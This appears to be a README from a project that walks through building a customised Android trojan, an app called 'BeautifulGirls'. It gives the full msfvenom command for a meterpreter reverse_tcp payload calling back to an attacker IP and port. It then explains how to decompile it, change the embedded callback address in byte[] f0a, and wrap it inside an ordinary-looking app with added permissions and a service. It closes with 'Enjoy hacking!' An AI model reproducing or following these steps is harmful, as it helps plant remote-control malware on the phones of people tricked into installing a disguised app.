The app "BeautifulGirls" is based on trojan apk generated by metasploit framework.

So how can I build it?

1.Generate trojan apk by metasploit framework.

E.g:
```msfvenom -p android/meterpreter/reverse_tcp lhost=172.20.2.143 lport=5555 R>./Payload.apk```

2.Then we decompile Payload.apk by jadx-gui-1.3.3-with-jre-win(I didn't find its linux version, if you have, thanks a lot for sharing), and save the source code.

3.Before building a customised trojan, we must ask such a question: where is the information needed for a successful HTTP or TCP connection saved?

Bingo, it's saved in f0a, the byte[] in file Payload.java!

After analyzing the code, I found the algorithms to decode f0a, so, I show the decoding process in this directory "Decode", almost copied from the decompiled files.

4.After that, we understand every time metasploit framework generates a trojan apk, what must be changed is only the byte[] f0a!  

5.Let's begin to build our customised trojan then!

> 1)Open your Android Studio and start from an empty activity;
> 
> 2)Copy the decompiled files to directory java/main/src;
> 
> 3)Press Alt +Enter to erase every red underline you meet;
> 
> 4)Remember to change the byte[] f0a, make sure it's your own ip address,get it from the decompiled file Payload.java (I can't understand how metasploit generates such a byte[], if you know, it will be much easier to change it!);
> 
> 5)Good! You are almost there! Add your customised activities to this project and all is done! Oh,wait a second!
> 
> 6)Don't forget to change AndroidManifest.xml, add permissions, service and so on!

6.Well, we got it! Kind of difficult, Aha~

**Enjoy hacking! Why not start android studio and msfconsole now?**
